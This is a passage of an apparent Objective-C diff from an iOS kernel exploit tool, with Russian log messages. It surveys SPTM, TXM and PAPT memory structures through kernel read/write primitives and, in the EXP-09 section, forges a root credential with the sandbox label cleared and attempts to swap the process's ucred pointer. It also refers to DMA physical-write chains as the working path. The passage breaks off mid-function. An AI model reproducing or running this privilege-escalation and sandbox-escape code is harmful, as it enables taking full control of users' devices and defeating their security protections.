+    if (!paddr || (paddr & 0x3FFF)) return NO;       // page-aligned DRAM PA
+    if (!kpPAIsManaged(paddr)) return NO;
+    if (count == 0 || count > 0x80000) return NO;    // sane page count
+    if (vabase && !kpLooksLikeKernelPointer(vabase)) return NO;
+    return YES;
+}
+
+static NSString *kpFmtSptmFn(uint64_t raw)
+{
+    uint64_t va = kp_untag_ptr(raw);
+    if (!va) return @"-";
+    if (kconstant(sptmBase) && va >= kconstant(sptmBase) && va < kconstant(sptmBase) + 0x100000) {
+        return [NSString stringWithFormat:@"sptm+%#llx", (unsigned long long)(va - kconstant(sptmBase))];
+    }
+    return [NSString stringWithFormat:@"0x%016llx", (unsigned long long)va];
+}
+
++ (NSString *)sptmSurveyReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== EXP-01..03: обзор SPTM (read-only) ===\n"];
+    if (!gPrimitives.kreadbuf) {
+        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
+        return r;
+    }
+
+    // ---------- EXP-01: allproc fix (multi-route) ----------
+    [r appendString:@"\n--- EXP-01: allproc (кандидаты + калибровка по kernel_task) ---\n"];
+    uint64_t head = [self resolveAllprocHeadWithLog:r];
+    if (head) {
+        uint64_t node = head, prev = 0;
+        for (int i = 0; i < 4 && kpLooksLikeKernelPointer(node) && node != prev; i++) {
+            kpDumpProc(r, "allproc", node, gCommOff);
+            uint64_t nextRaw = 0;
+            if (!kpRead(node + koffsetof(proc, list_next), &nextRaw, sizeof(nextRaw), "le_next", r)) break;
+            prev = node;
+            node = kp_untag_ptr(nextRaw);
+        }
+    }
+
+    // ---------- EXP-02: bases via DEBG + pointer-vote ----------
+    [r appendString:@"\n--- EXP-02: SPTM/TXM базы (DEBG + голосование) ---\n"];
+    [self harvestSptmTxmBasesWithLog:r];
+    kpNote(r, [NSString stringWithFormat:@"  итог: sptmBase=0x%016llx slide=0x%llx | txmBase=0x%016llx slide=0x%llx",
+              (unsigned long long)kconstant(sptmBase), (unsigned long long)kconstant(sptmSlide),
+              (unsigned long long)kconstant(txmBase), (unsigned long long)kconstant(txmSlide)]);
+
+    // ---------- EXP-03: frame survey ----------
+    [r appendString:@"\n--- EXP-03: frame table + дескрипторы + PAPT ---\n"];
+    uint64_t tableVA = [self frameTableVAWithLog:r];
+
+    uint64_t paramsVA = 0;
+    if (ksymbol(libsptm_frame_type_params)) {
+        uint64_t raw = 0;
+        if (kpRead(ksymbol(libsptm_frame_type_params), &raw, sizeof(raw), "libsptm_frame_type_params slot", r)) {
+            paramsVA = kp_untag_ptr(raw);
+            kpNote(r, [NSString stringWithFormat:@"  frame_type_params: raw=0x%016llx → VA 0x%016llx",
+                      (unsigned long long)raw, (unsigned long long)paramsVA]);
+        }
+    }
+
+    // Descriptor table: read the direct pointee first. If it reads as code
+    // stubs (few SPTM-image pointers), content-scan the libsptm block pointee
+    // pages for the page with the densest SPTM-image pointers — that's the
+    // real descriptor copy.
+    size_t descCount = 63, descSize = 0x60;
+    uint64_t descVA = 0;
+    uint8_t *desc = malloc(descCount * descSize);
+    memset(desc, 0, descCount * descSize);
+    if (paramsVA && kpLooksLikeKernelPointer(paramsVA)) {
+        if (kpRead(paramsVA, desc, descCount * descSize, "frame-type descriptors", r)) {
+            descVA = paramsVA;
+        }
+    }
+    if (descVA) {
+        // stub detection: count hooks stripping into the SPTM image
+        int sptmHits = 0;
+        if (kconstant(staticSptmBase)) {
+            uint64_t lo = kconstant(staticSptmBase), hi = lo + 0xF4000;
+            for (size_t i = 0; i < descCount; i++) {
+                const uint8_t *d = desc + i * descSize;
+                for (int f = 0; f < 4; f++) {
+                    static const int offs[4] = { 0x00, 0x08, 0x20, 0x30 };
+                    uint64_t raw = 0;
+                    memcpy(&raw, d + offs[f], 8);
+                    uint64_t va = kp_untag_ptr(raw);
+                    if (va >= lo && va < hi) sptmHits++;
+                }
+            }
+        }
+        if (sptmHits < 8) {
+            kpNote(r, [NSString stringWithFormat:@"  pointee дескрипторов читается как СТАБЫ/код (SPTM-хуков %d) — это function table, не данные; ищем data-страницу по контенту", sptmHits]);
+            descVA = 0;
+            // content-scan pointee pages
+            NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:nil];
+            uint64_t bestVA = 0;
+            int bestHits = 0;
+            for (NSNumber *pv in pointees) {
+                uint64_t pageVA = pv.unsignedLongLongValue;
+                uint8_t *pageBuf = malloc(0x4000);
+                memset(pageBuf, 0, 0x4000);
+                BOOL ok = YES;
+                for (uint64_t off = 0; ok && off < 0x4000; off += 0x400) {
+                    ok = kpRead(pageVA + off, pageBuf + off, 0x400, "desc scan", nil);
+                }
+                if (ok && kconstant(staticSptmBase)) {
+                    uint64_t lo = kconstant(staticSptmBase), hi = lo + 0xF4000;
+                    int hits = 0;
+                    for (uint32_t q = 0; q + 8 <= 0x4000; q += 8) {
+                        uint64_t raw = 0;
+                        memcpy(&raw, pageBuf + q, 8);
+                        uint64_t va = kp_untag_ptr(raw);
+                        if (va >= lo && va < hi) hits++;
+                    }
+                    if (hits > bestHits) { bestHits = hits; bestVA = pageVA; }
+                }
+                free(pageBuf);
+            }
+            if (bestVA) {
+                kpNote(r, [NSString stringWithFormat:@"  дескрипторная data-страница: 0x%016llx (SPTM-указателей: %d)", bestVA, bestHits]);
+                memset(desc, 0, descCount * descSize);
+                if (kpRead(bestVA, desc, descCount * descSize, "descriptor data page", r)) {
+                    descVA = bestVA;
+                }
+            }
+            else {
+                kpNote(r, @"  дескрипторная таблица не найдена среди pointee-страниц");
+            }
+        }
+    }
+
+    if (descVA) {
+        kpNote(r, [NSString stringWithFormat:@"  дескрипторы @ 0x%016llx (63 × 0x60):", descVA]);
+        [r appendString:@"   [idx] cls=b0/b1/b2 @+0x18, маски @+0x28/@+0x38, хуки @+0x00/+0x08/+0x20/+0x30 (sptm+off при известном слайде)\n"];
+        for (size_t i = 0; i < descCount; i++) {
+            const uint8_t *d = desc + i * descSize;
+            uint64_t fn0 = 0, fn1 = 0, fn2 = 0, fn3 = 0, m28 = 0, m38 = 0;
+            memcpy(&fn0, d + 0x00, 8);
+            memcpy(&fn1, d + 0x08, 8);
+            memcpy(&m28, d + 0x28, 8);
+            memcpy(&fn2, d + 0x20, 8);
+            memcpy(&fn3, d + 0x30, 8);
+            memcpy(&m38, d + 0x38, 8);
+            [r appendFormat:@"   [%02zu] cls=%02x/%02x/%02x m28=0x%010llx m38=0x%010llx | %@ %@ %@ %@\n",
+                i, d[0x18], d[0x19], d[0x1a],
+                (unsigned long long)m28, (unsigned long long)m38,
+                kpFmtSptmFn(fn0), kpFmtSptmFn(fn1), kpFmtSptmFn(fn2), kpFmtSptmFn(fn3)];
+        }
+    }
+    free(desc);
+
+    // PAPT hunt: content-validate block pointees. 24-B format (spec §6.3)
+    // first; then the 16-B fast-path format (§5.3, entries at +8, stride 16),
+    // +0x68 slot (state +112) first for the 16-B try.
+    uint64_t paptVA = 0;
+    uint64_t paptN = 0;
+    uint32_t paptFmt = 0;
+    NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:nil];
+    // 24-B hunt
+    for (NSNumber *pv in pointees) {
+        uint64_t cand = pv.unsignedLongLongValue;
+        uint8_t first2[48];
+        memset(first2, 0, sizeof(first2));
+        if (!kpRead(cand, first2, sizeof(first2), "papt candidate 24B", r)) continue;
+        if (kpPaptEntryPlausible(first2) && kpPaptEntryPlausible(first2 + 24)) {
+            paptVA = cand;
+            paptFmt = 0;
+            kpNote(r, [NSString stringWithFormat:@"  PAPT (24-B): найдена @ 0x%016llx", cand]);
+            break;
+        }
+    }
+    // 16-B hunt (+0x68 slot = state +112 first, per §5.2)
+    if (!paptVA && pointees.count) {
+        NSMutableArray<NSNumber *> *order = [NSMutableArray array];
+        // the +0x68 slot's pointee is pointees[13] (index 0x68/8); try it first
+        if (pointees.count > 13) [order addObject:pointees[13]];
+        for (NSNumber *pv in pointees) {
+            if (![order containsObject:pv]) [order addObject:pv];
+        }
+        for (NSNumber *pv in order) {
+            uint64_t cand = pv.unsignedLongLongValue;
+            uint8_t first3[64];
+            memset(first3, 0, sizeof(first3));
+            if (!kpRead(cand, first3, sizeof(first3), "papt candidate 16B", r)) continue;
+            // entries at +8, stride 16: {va_base, start_pfn:u32@8, count:u24@12}
+            BOOL ok = YES;
+            for (int e = 0; e < 2; e++) {
+                uint32_t pfn = 0, cntRaw = 0;
+                memcpy(&pfn, first3 + 8 + e * 16, 4);
+                memcpy(&cntRaw, first3 + 8 + e * 16 + 8, 4);
+                uint64_t pa = (uint64_t)pfn * 0x4000;
+                uint32_t cnt = cntRaw & 0xFFFFFF;
+                if (!kpPAIsManaged(pa) || cnt == 0 || cnt > 0x100000) { ok = NO; break; }
+            }
+            if (ok) {
+                paptVA = cand;
+                paptFmt = 1;
+                kpNote(r, [NSString stringWithFormat:@"  PAPT (16-B fast-path): найдена @ 0x%016llx", cand]);
+                break;
+            }
+        }
+    }
+
+    if (paptVA) {
+        // count ranges: u32 at symbol, else pointer-chase, else walk
+        uint32_t n = 0;
+        if (ksymbol(libsptm_n_papt_ranges)) {
+            kpRead(ksymbol(libsptm_n_papt_ranges), &n, sizeof(n), "libsptm_n_papt_ranges", r);
+            if (n == 0 || n > 64) {
+                uint64_t nptr = 0;
+                if (kpRead(ksymbol(libsptm_n_papt_ranges), &nptr, sizeof(nptr), "n_papt_ranges ptr", r)) {
+                    nptr = kp_untag_ptr(nptr);
+                    if (kpLooksLikeKernelPointer(nptr)) kpRead(nptr, &n, sizeof(n), "n_papt_ranges chase", r);
+                }
+            }
+        }
+        if (n == 0 || n > 64) {
+            // walk until the signature breaks
+            n = 0;
+            while (n < 64) {
+                uint8_t ent[24];
+                memset(ent, 0, sizeof(ent));
+                uint64_t eVA = paptFmt == 1 ? paptVA + 8 + n * 16 : paptVA + n * 24;
+                if (!kpRead(eVA, ent, sizeof(ent), "papt walk", r)) break;
+                if (paptFmt == 1) {
+                    uint32_t pfn = 0, cntRaw = 0;
+                    memcpy(&pfn, ent, 4);
+                    memcpy(&cntRaw, ent + 8, 4);
+                    uint64_t pa = (uint64_t)pfn * 0x4000;
+                    uint32_t cnt = cntRaw & 0xFFFFFF;
+                    if (!kpPAIsManaged(pa) || cnt == 0 || cnt > 0x100000) break;
+                }
+                else {
+                    if (!kpPaptEntryPlausible(ent)) break;
+                }
+                n++;
+            }
+        }
+        paptN = n;
+        kpNote(r, [NSString stringWithFormat:@"  PAPT: table=0x%016llx n=%llu fmt=%s", paptVA, (unsigned long long)paptN, paptFmt ? "16-B" : "24-B"]);
+
+        for (uint64_t i = 0; i < paptN && i < 32; i++) {
+            uint8_t ent[24];
+            memset(ent, 0, sizeof(ent));
+            uint64_t eVA = paptFmt == 1 ? paptVA + 8 + i * 16 : paptVA + i * 24;
+            if (!kpRead(eVA, ent, sizeof(ent), "papt entry", r)) break;
+            uint64_t paddr = 0, vabase = 0;
+            uint32_t count = 0;
+            if (paptFmt == 1) {
+                memcpy(&vabase, ent, 8);
+                uint32_t pfn = 0, cntRaw = 0;
+                memcpy(&pfn, ent + 8, 4);
+                memcpy(&cntRaw, ent + 12, 4);
+                paddr = (uint64_t)pfn * 0x4000;
+                count = cntRaw & 0xFFFFFF;
+            }
+            else {
+                memcpy(&paddr, ent, 8);
+                memcpy(&vabase, ent + 8, 8);
+                memcpy(&count, ent + 16, 4);
+            }
+            [r appendFormat:@"    papt[%02llu] pa=0x%010llx va=0x%016llx pages=%u (pa …+0x%llx)\n",
+                (unsigned long long)i, (unsigned long long)paddr,
+                (unsigned long long)vabase, count,
+                (unsigned long long)count * 0x4000];
+        }
+
+        kp_papt_table_va = paptVA;
+        kp_papt_table_n = paptN;
+        kp_papt_format = paptFmt;
+    }
+    else {
+        kpNote(r, @"  PAPT-таблица не найдена среди pointees (24-B и 16-B) — kvtophys недоступен");
+    }
+
+    // Translation self-check: VA-mode (cpu_ttep stripped as VA) vs PA-mode
+    // (TTBR phys). Accept whichever yields a plausible PA for the kernel base.
+    BOOL translOK = NO;
+    if (kp_papt_table_va) {
+        uint64_t basePA = 0;
+        const char *mode = "нет";
+        if (gCpuTtepVA && kpLooksLikeKernelPointer(gCpuTtepVA)) {
+            gSystemInfo.kernelConstant.cpuTTEP = gCpuTtepVA;
+            errno = 0;
+            uint64_t pa = kvtophys(kconstant(base));
+            kpNote(r, [NSString stringWithFormat:@"  kvtophys VA-режим: base → PA=0x%010llx (errno=%d)", (unsigned long long)pa, errno]);
+            if (pa && kpPAIsManaged(pa)) { basePA = pa; mode = "VA"; }
+        }
+        if (!basePA && kconstant(cpuTTEP)) {
+            gSystemInfo.kernelConstant.cpuTTEP = gCpuTtepPhys;
+            errno = 0;
+            uint64_t pa = kvtophys(kconstant(base));
+            kpNote(r, [NSString stringWithFormat:@"  kvtophys PA-режим (TTBR): base → PA=0x%010llx (errno=%d)", (unsigned long long)pa, errno]);
+            if (pa && kpPAIsManaged(pa)) { basePA = pa; mode = "PA(TTBR)"; }
+        }
+        if (basePA) {
+            translOK = YES;
+            kpNote(r, [NSString stringWithFormat:@"  kvtophys работает: режим=%s, kernel base PA=0x%010llx", mode, (unsigned long long)basePA]);
+        }
+        else {
+            kpNote(r, @"  kvtophys не работает ни в одном режиме — калибровка типов пропущена");
+        }
+    }
+
+    // Frame-type calibration on known-role anchors, then a sampled sweep.
+    if (tableVA && translOK) {
+        [r appendString:@"\n  Калибровка типов фреймов (kvtophys + fte[2]):\n"];
+        struct { const char *role; uint64_t va; } anchors[4];
+        int na = 0;
+        anchors[na].role = "kernel text (base)"; anchors[na].va = kconstant(base); na++;
+        if (gCpuTtepVA && kpLooksLikeKernelPointer(gCpuTtepVA)) {
+            anchors[na].role = "корень TT (cpu_ttep VA)"; anchors[na].va = gCpuTtepVA; na++;
+        }
+        anchors[na].role = "frame table (сама)"; anchors[na].va = tableVA; na++;
+        uint64_t selfProc = [self findSelfProcByComm:r];
+        if (!selfProc) selfProc = [self findProcByPid:(uint32_t)getpid() log:r];
+        if (selfProc) {
+            anchors[na].role = "наш proc (heap)"; anchors[na].va = selfProc; na++;
+        }
+        for (int i = 0; i < na; i++) {
+            errno = 0;
+            uint64_t pa = kvtophys(anchors[i].va);
+            int type = (pa != 0) ? kpFrameTypeOfPALogged(tableVA, pa, r) : -1;
+            kpNote(r, [NSString stringWithFormat:@"    %-24s VA=0x%016llx PA=0x%010llx type=%@",
+                      anchors[i].role, (unsigned long long)anchors[i].va,
+                      (unsigned long long)pa,
+                      type < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", type]]);
+            if (selfProc && anchors[i].va == selfProc && type >= 0) {
+                gHeapFrameType = (uint8_t)type;
+                gHeapTypeKnown = YES;
+            }
+        }
+
+        if (paptVA && paptN) {
+            [r appendString:@"\n  Развёртка типов по PAPT-диапазонам (выборка ≤16 страниц на диапазон):\n"];
+            NSMutableDictionary<NSNumber *, NSNumber *> *hist = [NSMutableDictionary dictionary];
+            uint64_t sampled = 0;
+            for (uint64_t i = 0; i < paptN && i < 32; i++) {
+                uint8_t ent[24];
+                memset(ent, 0, sizeof(ent));
+                uint64_t eVA = paptFmt == 1 ? paptVA + 8 + i * 16 : paptVA + i * 24;
+                if (!kpRead(eVA, ent, sizeof(ent), "papt entry", r)) break;
+                uint64_t paddr = 0;
+                uint32_t count = 0;
+                if (paptFmt == 1) {
+                    uint32_t pfn = 0, cntRaw = 0;
+                    memcpy(&pfn, ent, 4);
+                    memcpy(&cntRaw, ent + 8, 4);
+                    paddr = (uint64_t)pfn * 0x4000;
+                    count = cntRaw & 0xFFFFFF;
+                }
+                else {
+                    memcpy(&paddr, ent, 8);
+                    memcpy(&count, ent + 16, 4);
+                }
+                uint32_t step = count / 16 ? count / 16 : 1;
+                for (uint32_t pg = 0; pg < count && pg / step < 16; pg += step) {
+                    int t = kpFrameTypeOfPAQuiet(tableVA, paddr + (uint64_t)pg * 0x4000);
+                    if (t < 0) continue;
+                    NSNumber *key = @(t & 0xff);
+                    hist[key] = @(hist[key].unsignedIntValue + 1);
+                    sampled++;
+                }
+            }
+            NSArray<NSNumber *> *types = [hist.allKeys sortedArrayUsingSelector:@selector(compare:)];
+            for (NSNumber *t in types) {
+                [r appendFormat:@"    type 0x%02x: %u страниц%s\n",
+                    t.unsignedIntValue, hist[t].unsignedIntValue,
+                    (gHeapTypeKnown && t.unsignedIntValue == gHeapFrameType) ? "  ← XNU_DEFAULT (heap, writable)" : ""];
+            }
+            kpNote(r, [NSString stringWithFormat:@"  всего отсемплировано: %llu страниц", (unsigned long long)sampled]);
+        }
+    }
+    else if (tableVA) {
+        kpNote(r, @"  калибровка типов: пропущена (нет рабочей трансляции)");
+    }
+
+    if (gHeapTypeKnown) {
+        [r appendFormat:@"\n  ПРЕДИКАТ ЗАПИСИ: type == 0x%02x (калибровано по нашему proc) ⇔ kwrite без паники; всё остальное — фолт в physical aperture\n",
+            gHeapFrameType];
+    }
+    else {
+        [r appendString:@"\n  ПРЕДИКАТ ЗАПИСИ: не калиброван (нет PAPT/kvtophys) — запись только после ручной проверки\n"];
+    }
+    [r appendString:@"\n=== EXP-01..03 завершены (read-only, паники быть не должно) ===\n"];
+    return r;
+}
+
+#pragma mark - EXP-09: ucred pointer-swap root (heap-only)
+
++ (NSString *)ucredHeapSwapReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== EXP-09: root через подмену указателя p_ucred (heap-only) ===\n"];
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
+        return r;
+    }
+
+    // 1. Own proc. 1.9.0: proc_self() direct (offsets chain, no allproc walk —
+    //    the walk was the panic source). comm/pid routes stay as fallback.
+    pid_t selfPid = getpid();
+    kpNote(r, [NSString stringWithFormat:@"  наш pid: %d", selfPid]);
+    uint64_t selfProc = proc_self();
+    kpNote(r, [NSString stringWithFormat:@"  наш proc (proc_self): 0x%016llx", (unsigned long long)selfProc]);
+    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)selfPid log:r];
+    if (!selfProc) selfProc = [self findSelfProcByComm:r];
+    if (!selfProc) selfProc = [self findProcByPid:(uint32_t)selfPid log:r];
+    if (!selfProc) {
+        [r appendString:@"FAIL: свой proc не найден\n"];
+        return r;
+    }
+    if (gCommOff) {
+        uint8_t full[0x400];
+        memset(full, 0, sizeof(full));
+        if (kpRead(selfProc, full, sizeof(full), "self proc", r)) {
+            char comm[33] = {0};
+            memcpy(comm, full + gCommOff, 32);
+            kpNote(r, [NSString stringWithFormat:@"  comm нашего proc: \"%s\" (ждём KexProofV2)", comm]);
+        }
+    }
+
+    // 2. Locate the ucred pointer field. The 18.6 ladder: proc.ucred is a
+    //    tombstone (moved at 15.2); the live one is proc_ro->ucred at
+    //    *(proc+0x18) + 0x28. The spec's 0xD8 slot is logged for comparison.
+    uint64_t legacyRaw = 0;
+    kpRead(selfProc + 0xD8, &legacyRaw, sizeof(legacyRaw), "proc+0xD8 (legacy ucred)", r);
+    kpNote(r, [NSString stringWithFormat:@"  proc+0xD8 = 0x%016llx (мёртвое поле на 15.2+; ucred уехал в proc_ro)",
+              (unsigned long long)legacyRaw]);
+
+    uint64_t procRoRaw = 0;
+    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &procRoRaw, sizeof(procRoRaw), "proc.proc_ro", r)) {
+        [r appendString:@"FAIL: proc.proc_ro не прочитан\n"];
+        return r;
+    }
+    uint64_t procRo = kp_untag_ptr(procRoRaw);
+    kpNote(r, [NSString stringWithFormat:@"  proc_ro: raw=0x%016llx → 0x%016llx",
+              (unsigned long long)procRoRaw, (unsigned long long)procRo]);
+    if (!kpLooksLikeKernelPointer(procRo)) {
+        [r appendString:@"FAIL: proc_ro не kernel-указатель\n"];
+        return r;
+    }
+
+    uint64_t ucredSlot = procRo + koffsetof(proc_ro, ucred);
+    uint64_t curUcredRaw = 0;
+    if (!kpRead(ucredSlot, &curUcredRaw, sizeof(curUcredRaw), "proc_ro.ucred", r)) {
+        [r appendString:@"FAIL: proc_ro.ucred не прочитан\n"];
+        return r;
+    }
+    uint64_t curUcred = kp_untag_ptr(curUcredRaw);
+    kpNote(r, [NSString stringWithFormat:@"  proc_ro.ucred @ %#llx: raw=0x%016llx → 0x%016llx",
+              (unsigned long long)ucredSlot, (unsigned long long)curUcredRaw, (unsigned long long)curUcred]);
+    if (!kpLooksLikeKernelPointer(curUcred)) {
+        [r appendString:@"FAIL: ucred не kernel-указатель\n"];
+        return r;
+    }
+
+    // Validate the field: cr_uid (+0x18) must equal getuid().
+    uint8_t realCred[0x120];
+    memset(realCred, 0, sizeof(realCred));
+    if (!kpRead(curUcred, realCred, sizeof(realCred), "current ucred", r)) {
+        [r appendString:@"FAIL: текущий ucred не читается\n"];
+        return r;
+    }
+    uint32_t curUid = 0, curGid = 0;
+    memcpy(&curUid, realCred + 0x18, sizeof(curUid));
+    memcpy(&curGid, realCred + 0x28, sizeof(curGid));
+    kpNote(r, [NSString stringWithFormat:@"  текущий ucred: uid=%u gid=%u (getuid()=%d getgid()=%d)",
+              curUid, curGid, getuid(), getgid()]);
+    if (curUid != (uint32_t)getuid()) {
+        [r appendString:@"FAIL: cr_uid не совпал с getuid() — поле не подтверждено, запись отменена\n"];
+        return r;
+    }
+
+    // 1.9.3: pointer swap via a forge in OUR OWN wired user page, which the
+    // kernel reads through the physmap. The 1.9.2 in-place patch proved ucred
+    // is read-only cred memory on 18.6 (setsockopt refuses, nothing lands).
+    // proc_ro is RW. Chain to our page's kernel VA:
+    //   proc -> proc_ro -> task -> vm_map -> pmap -> ttep, then
+    //   vtophys(ourPmapTtep, page) gives the page's PA, and the physmap is
+    //   linear: kernelVA = virtBase + (pa - physBase).
+    {
+        // forged ucred: copy of the validated real one, uid/gid zeroed, MAC
+        // label cleared (sandbox off), refcount bumped so it never frees.
+        uint8_t forge[0x120];
+        memcpy(forge, realCred, sizeof(forge));
+        memset(forge + 0x18, 0, 12);  // cr_uid / cr_ruid / cr_svuid = 0
+        memset(forge + 0x28, 0, 4);   // cr_groups[0] (primary gid) = 0
+        memset(forge + 0x68, 0, 8);   // cr_rgid / cr_svgid = 0
+        memset(forge + 0x78, 0, 8);   // cr_label = NULL — sandbox label off
+        uint32_t ref = 0;
+        memcpy(&ref, realCred + 0x10, sizeof(ref));
+        ref += 0x1000;
+        memcpy(forge + 0x10, &ref, sizeof(ref));
+
+        // a wired page we own, holding the forge
+        uint8_t *page = NULL;
+        if (posix_memalign((void **)&page, 0x4000, 0x4000) != 0 || !page) {
+            [r appendString:@"FAIL: posix_memalign\n"];
+            return r;
+        }
+        memset(page, 0, 0x4000);
+        memcpy(page, forge, sizeof(forge));
+        if (mlock(page, 0x4000) != 0) {
+            kpNote(r, [NSString stringWithFormat:@"  mlock: %s — продолжаю (страница свежая, не выгрузится сразу)", strerror(errno)]);
+        }
+
+        // proc_ro -> task -> map -> pmap -> ttep
+        uint64_t task = 0, map = 0, pmap = 0, ttep = 0;
+        if (!kpRead(procRo + off_proc_ro_pr_task, &task, sizeof(task), "proc_ro.pr_task", r)) return r;
+        task = kp_untag_ptr(task);
+        if (!kpLooksLikeKernelPointer(task)) { [r appendString:@"FAIL: task\n"]; return r; }
+        if (!kpRead(task + off_task_map, &map, sizeof(map), "task.map", r)) return r;
+        map = kp_untag_ptr(map);
+        if (!kpLooksLikeKernelPointer(map)) { [r appendString:@"FAIL: map\n"]; return r; }
+        if (!kpRead(map + koffsetof(vm_map, pmap), &pmap, sizeof(pmap), "vm_map.pmap", r)) return r;
+        pmap = kp_untag_ptr(pmap);
+        if (!kpLooksLikeKernelPointer(pmap)) { [r appendString:@"FAIL: pmap\n"]; return r; }
+        if (!kpRead(pmap + koffsetof(pmap, ttep), &ttep, sizeof(ttep), "pmap.ttep", r)) return r;
+        ttep = kp_untag_ptr(ttep);
+        kpNote(r, [NSString stringWithFormat:@"  цепь: task=%#llx map=%#llx pmap=%#llx ttep=%#llx",
+                  (unsigned long long)task, (unsigned long long)map,
+                  (unsigned long long)pmap, (unsigned long long)ttep]);
+
+        // our page's physical address via OUR pmap, then its kernel VA.
+        // 1.9.4: through the real ptov_table (phystokv), NOT the linear
+        // formula — on A17 the physmap is NOT linear from physBase, and the
+        // formula produced an unmapped VA (kvtophys=0, readback garbage).
+        uint64_t pa = vtophys(ttep, (uint64_t)page);
+        if (!pa) {
+            [r appendString:@"FAIL: vtophys нашей страницы = 0 (не замаплена?)\n"];
+            return r;
+        }
+        uint64_t forgeKVA = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  страница: userVA=%#llx pa=%#llx → kernel VA (ptov)=%#llx",
+                  (unsigned long long)page, (unsigned long long)pa, (unsigned long long)forgeKVA]);
+        if (!kpLooksLikeKernelPointer(forgeKVA)) {
+            // fallback: the linear physmap guess, so the log shows both
+            uint64_t lin = kconstant(virtBase) + (pa - kconstant(physBase));
+            kpNote(r, [NSString stringWithFormat:@"  ptov дал 0 — линейная оценка: %#llx", (unsigned long long)lin]);
+            [r appendString:@"FAIL: phystokv не дал kernel VA для страницы\n"];
+            return r;
+        }
+
+        // sanity: read the forge back THROUGH the kernel VA
+        uint64_t probe = 0;
+        if (kpRead(forgeKVA, &probe, sizeof(probe), "forge readback", r)) {
+            kpNote(r, [NSString stringWithFormat:@"  чтение форжа по kernel VA: %#llx (ждём начало скопированного ucred)", (unsigned long long)probe]);
+        }
+
+        // the swap: one 8-byte heap write into proc_ro
+        static uint64_t sOrigUcred = 0;
+        sOrigUcred = curUcred;
+        kpNote(r, [NSString stringWithFormat:@"  оригинальный p_ucred = 0x%016llx", (unsigned long long)sOrigUcred]);
+        // kexproofv2 2.0.0: kwrite по proc_ro отключён ОСОЗНАННО. На 15.2+
+        // proc_ro живёт в ZC_READONLY-зоне (pmap_ro_zone / __zalloc_ro_mut в
+        // ядре 22G100) — kernel-VA запись через setsockopt-filtre не ложится
+        // (1.9.279: early_kwrite32bytes res=-1, readback без изменений).
+        // Живой путь — DMA physwrite8 в поле (PSWAP/PSWAP-B) или in-place
+        // патч ucred (INPL) в авто-цепи PHYSWRITE. Здесь только диагноз.
+        {
+            uint64_t rbDry = 0;
+            kpRead(ucredSlot, &rbDry, sizeof(rbDry), "p_ucred dry-read", r);
+            kpNote(r, [NSString stringWithFormat:@"  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=%#llx (оригинал на месте, это ок)",
+                      (unsigned long long)kp_untag_ptr(rbDry)]);
+            [r appendString:@"FAIL: heap-only swap через kwrite нежизнеспособен на 18.6 — proc_ro RO-зона.\n"];
+            [r appendString:@"Используй авто-цепь PHYSWRITE: INPL (in-place ucred) или PSWAP-B (DMA в поле p_ucred).\n"];
+            return r;
+        }
+    }
+
+    // 3. Forge a ucred copy in a pipe buffer — XNU_DEFAULT heap we own. The
+    //    pipe is never closed: the forged object stays permanent (spec §3).
+    static int sForgePipe[2] = { -1, -1 };
+    if (sForgePipe[0] < 0) {
+        if (pipe(sForgePipe) != 0) {
+            [r appendString:@"FAIL: pipe()\n"];
+            return r;
+        }
+    }
+
+    static const uint8_t kForgeMagic[16] = { 'K','P','R','C','R','E','D','1','K','P','R','C','R','E','D','1' };
+    uint8_t forge[16 + 0x120];
+    memset(forge, 0, sizeof(forge));
+    memcpy(forge, kForgeMagic, sizeof(kForgeMagic));
+    memcpy(forge + 16, realCred, sizeof(realCred));
+    memset(forge + 16 + 0x18, 0, 12);  // cr_uid / cr_ruid / cr_svuid = 0
+    memset(forge + 16 + 0x28, 0, 4);   // cr_groups[0] (primary gid) = 0
+    memset(forge + 16 + 0x68, 0, 8);   // cr_rgid / cr_svgid = 0
+    memset(forge + 16 + 0x78, 0, 8);   // cr_label = NULL — cleared MAC label
+    uint32_t ref = 0;
+    memcpy(&ref, realCred + 0x10, sizeof(ref));
+    ref += 0x1000;                     // refcount bump: exit-time unref never frees
+    memcpy(forge + 16 + 0x10, &ref, sizeof(ref));
+
+    ssize_t wr = write(sForgePipe[1], forge, sizeof(forge));
+    if (wr != (ssize_t)sizeof(forge)) {
+        [r appendString:@"FAIL: write в pipe\n"];
+        return r;
+    }
+
+    // 4. Find the pipe buffer's kernel VA via our own fd table, then confirm
+    //    by the magic header (no pipe-layout offsets hardcoded).
+    uint64_t fdPtr = 0;
+    kpRead(selfProc + koffsetof(proc, fd), &fdPtr, sizeof(fdPtr), "proc.fd", r);
+    uint64_t fdTable = kp_untag_ptr(fdPtr);
+    uint64_t ofilesVA = fdTable + 0x28; // filedesc.ofiles_start (16+ ladder)
+    kpNote(r, [NSString stringWithFormat:@"  fd table=0x%016llx ofiles=0x%016llx wfd=%d",
+              (unsigned long long)fdTable, (unsigned long long)ofilesVA, sForgePipe[1]]);
+
+    uint64_t fpRaw = 0, globRaw = 0, dataRaw = 0;
+    kpRead(ofilesVA + (uint64_t)sForgePipe[1] * 8, &fpRaw, sizeof(fpRaw), "ofiles[wfd]", r);
+    uint64_t fileprocVA = kp_untag_ptr(fpRaw);
+    kpRead(fileprocVA + 0x10, &globRaw, sizeof(globRaw), "fileproc.glob", r);
+    uint64_t globVA = kp_untag_ptr(globRaw);
+    kpRead(globVA + 0x38, &dataRaw, sizeof(dataRaw), "fileglob.data", r);
+    uint64_t pipeVA = kp_untag_ptr(dataRaw);
+    kpNote(r, [NSString stringWithFormat:@"  fileproc=0x%016llx glob=0x%016llx pipe=0x%016llx",
+              (unsigned long long)fileprocVA, (unsigned long long)globVA, (unsigned long long)pipeVA]);
+    if (!kpLooksLikeKernelPointer(pipeVA)) {
